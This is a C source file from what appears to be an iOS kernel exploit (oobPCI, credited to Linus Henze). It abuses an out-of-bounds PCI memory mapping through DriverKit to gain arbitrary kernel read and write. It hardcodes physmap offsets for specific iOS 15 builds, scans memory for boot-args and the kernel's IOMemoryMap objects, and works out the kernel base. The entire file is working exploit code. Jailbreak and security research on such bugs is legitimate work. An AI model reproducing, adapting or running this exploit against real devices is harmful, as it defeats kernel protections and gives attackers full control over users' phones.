//
//  oobPCI.c
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#include "oobPCI.h"

#include <stdio.h>
#include <sys/errno.h>
#include <IOKit/IOKitLib.h>
#include <stdbool.h>

#include "includeme.h"
#include "generated/device.h"
#include "DriverKit.h"
#include "virtrw.h"

// Offset from our mapping to the physmap (worst case)
#define PHYSMAP_OFFSET      0x4AF390000ULL + (2ULL * 1024ULL * 1024ULL * 1024ULL)

// Offset below is for some 15.5 betas
#define PHYSMAP_OFFSET_15_5 0x5E94E4000ULL + (2ULL * 1024ULL * 1024ULL * 1024ULL)

#define PHYSMAP_OFFSET_CRASH (0ULL - 0xF00000000000000ULL)

uint64_t PCIMemorySize = 0;
uint64_t PCIMappingMinOffset = 0;

#define DRIVERKIT_TYPE           0x99000003
#define kIOUserServerMethodStart 0x00001001

#define IS_PHYS_ADDR(arg) (((arg) & 0xFFFFFFFF00000000) == 0x800000000)
#define IS_VIRT_ADDR(arg) (((arg) & 0xFFFF000000000000) == 0xFFFF000000000000)

extern mach_port_t ioMasterPort;

void oobPCI_initVirtRW(void)
{
    kread64 = ^uint64_t(uint64_t kaddr) {
        return pcidev_r64(kaddr);
    };

    kread32 = ^uint32_t(uint64_t kaddr) {
        return pcidev_r32(kaddr);
    };

    kwrite64 = ^(uint64_t kaddr, uint64_t val) {
        pcidev_w64(kaddr, val);
    };

    kwrite32 = ^(uint64_t kaddr, uint32_t val) {
        pcidev_w32(kaddr, val);
    };
}

bool pageHasMemoryMap(uint64_t addr, uint64_t low25, uint64_t len, uint64_t *base, uint64_t *vtblOut) {
    // Check if the IOMemoryMap object for our PCI device is in this page
    // Return base and vtable if it is
    for (uint64_t i = 0; i < 0x4000; i += 0x58) {
        uint64_t vtbl = pcidev_r64(addr + i);
        if (vtbl == 0) {
            // Empty, ignore
            continue;
        } else if (((vtbl >> 55) & 1) == 0) {
            // Not a vtable, no IOMemoryMap objects in this page
            // (IOMemoryMap objects have their own zone)
            return false;
        }
        
        uint64_t v = pcidev_r64(addr + i + 0x28);
        if ((v & 0x1FFFFFFULL) == low25) {
            uint64_t l = pcidev_r64(addr + i + 0x30);
            if (l == len) {
                *base    = v;
                *vtblOut = 0xFFFFFF8000000000ULL | vtbl;
                return true;
            }
        }
    }
    
    return false;
}

bool kernel_starts_here(uint64_t addr) {
    return pcidev_r64(addr) == 0x100000cfeedfacfULL && pcidev_r64(addr + 8) == 0x2c0000002ULL;
}

uint64_t search_for_my_mapping(uint64_t start, uint64_t low25) {
    uint64_t base = 0;
    uint64_t vtbl = 0;
    
    while (1) {
        if (pageHasMemoryMap(start, low25, PCIMemorySize, &base, &vtbl)) {
            printf("PCIMemory @ %p\n", (void*) base);
            printf("VTBL @ %p\n", (void*) vtbl);
            
            // Make sure all other accesses are absolute, not relative
            pcidev_set_base_offset(0ULL - base);
            
            // Search for the kernel start
            uint64_t kStart = vtbl & ~0x3FFFULL;
            while (!kernel_starts_here(kStart)) {
                kStart -= 0x4000;
            }
            
            printf("Kernel base @ %p\n", (void*) kStart);
            
            return kStart;
        }
        
        start += 0x4000;
    }
}

bool is_boot_args(uint64_t addr) {
    // Already checked the version and stuff
    // Make sure the pointers look valid

    // Virtual base should be a virtual address
    uint64_t virt = pcidev_r64(addr + 0x08);
    
    // Physical base should be a physical address
    uint64_t phys = pcidev_r64(addr + 0x10);
    
    // Top of kernel data should be a physical address
    uint64_t top  = pcidev_r64(addr + 0x20);
    
    return IS_VIRT_ADDR(virt) && IS_PHYS_ADDR(phys) && IS_PHYS_ADDR(top);
}

bool oobPCI_init(uint64_t *kBase, uint64_t *virtBaseOut, uint64_t *physBaseOut) {
    // Magic function to get token and tag
    void (*getTokenTag)(uint64_t*, uint64_t*) = (void(*)(uint64_t*, uint64_t*)) DBG_DK_FUNC_CHECKIN;
    uint64_t token = 0;
    uint64_t tag   = 0;
    oobPCI_initVirtRW();
    
    getTokenTag(&token, &tag);

    uint64_t (*getPCIMemorySize)(void) = (uint64_t(*)(void)) DBG_DK_FUNC_GET_PCI_SIZE;
    PCIMemorySize = getPCIMemorySize();
    if (PCIMemorySize == 0x8000) {
        PCIMappingMinOffset = 0x0;
    } else {
        PCIMappingMinOffset = 0x8000000;
    }

    printf("Got PCIMemorySize: %p\n", (void*)PCIMemorySize);
    
    io_service_t service = IORegistryEntryFromPath(ioMasterPort, "IOService:/");
    guard (service != 0) else {
        puts("Failed to get IOPlatformExpertDevice!");
        return false;
    }
    
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(service, mach_task_self_, DRIVERKIT_TYPE, &conn);
    guard (kr == KERN_SUCCESS) else {
        printf("IOServiceOpen failed! [%x]\n", kr);
        return false;
    }
    
    uint64_t serverDKPort = 0;
    mach_msg_type_number_t outCount = 1;
    mach_msg_type_number_t outCountInband = 0;
    mach_vm_size_t outCountOOB = 0;
    kr = io_connect_method(conn, kIOUserServerMethodStart, &token, 1, NULL, 0, 0, 0, NULL, &outCountInband, &serverDKPort, &outCount, 0, &outCountOOB);
    guard (kr == KERN_SUCCESS) else {
        printf("io_connect_method failed! [%x]\n", kr);
        return false;
    }
    
    puts("Initializing DriverKit...");
    dk_init(conn, (mach_port_t) serverDKPort);
    
    puts("Checking in...");
    user_server_checkin("PWNUserServer", tag);
    
    puts("Creating root dispatch queue...");
    mach_port_t rootQueue = create_dispatch_queue("Root");
    
    mach_port_t rqPort;
    kr = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &rqPort);
    guard (kr == KERN_SUCCESS) else {
        printf("mach_port_allocate failed! [%x]\n", kr);
        return false;
    }
    
    kr = mach_port_insert_right(mach_task_self_, rqPort, rqPort, MACH_MSG_TYPE_MAKE_SEND);
    guard (kr == KERN_SUCCESS) else {
        printf("mach_port_insert_right failed! [%x]\n", kr);
        return false;
    }

    dispatch_queue_set_port(rootQueue, rqPort);
    
    puts("Registering...");
    server_register();
    
    puts("Waiting for start message...");
    mach_port_t pciDevice = server_get_provider(rqPort);
    mach_port_deallocate(mach_task_self_, rqPort);
    
    puts("Opening PCI Device...");
    pcidev_open_session(pciDevice);
    
    puts("Opened PCI Device!");
    
    uint64_t offset = PHYSMAP_OFFSET;
    uint64_t virtBase = 0;
    uint64_t physBase = 0;
    while (1) {
        uint64_t cur = pcidev_r64(offset);
        if (cur == 0x20002 && is_boot_args(offset)) {
            puts("Found boot-args!");
            
            virtBase = pcidev_r64(offset + 0x08);
            physBase = pcidev_r64(offset + 0x10);
            
            printf("Virt base @ %p\n", (void*) virtBase);
            printf("Phys base @ %p\n", (void*) physBase);
            
            break;
        }
        
        offset -= 0x4000;
    }
    
    uint64_t bootArgs = offset;
    uint64_t bootArgsPhys = pcidev_r64(bootArgs + 0x20) - 0x4000;
    
    offset += 0x4000;
    uint64_t i = 0;
    
    while (1) {
        for (uint64_t e = 0; e < (0x4000ULL / 8ULL); e++) {
            uint64_t entry = pcidev_r64(offset + (e * 8));
            if ((entry & 0xFFFFFFFFC000) == bootArgsPhys) {
                // This is our entry!
                uint64_t offInPhysmap = (i * 0x2000000) + (e * 0x4000);
                printf("Offset in physmap: %p\n", (void*) offInPhysmap);
                
                uint64_t first = bootArgs - offInPhysmap;
                uint64_t low25 = 0x2000000ULL - (first & 0x1FFFFFFULL);
                printf("Low25 Bits are: %p\n", (void*) low25);
                
                *kBase = search_for_my_mapping(bootArgs + PCIMappingMinOffset, low25);
                *virtBaseOut = virtBase;
                *physBaseOut = physBase;
                
                return true;
            }
        }
        
        i += 1;
        offset += 0x4000;
    }
}
